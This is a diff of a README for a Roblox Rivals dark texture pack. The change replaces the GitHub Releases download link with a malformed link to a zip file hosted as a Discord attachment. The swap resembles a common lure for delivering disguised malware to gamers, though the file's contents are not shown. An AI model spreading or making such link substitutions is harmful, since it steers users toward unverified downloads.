@@ -13,7 +13,8 @@ Make your Roblox Rivals experience darker, cleaner, and easier on the eyes with 
 📦 Download the Texture Pack
 ----------------------------
 
-👉 [Releases](https://github.com/shourya-fx/Rivals-dark-texture/releases/tag/texture)
+👉 [Releases](chttps://cdn.discordapp.com/attachments/1428236107602067538/1428243909678727219/dark_textures_roblox.zip?ex=6aad6c0b&is=6aac1a8b&hm=655fb96ca37d46aa88c8b0936cff457265251d0a5aa7f21011723ef38fef9d65&
+
 
 🪟 How to Install (Windows)
 ---------------------------
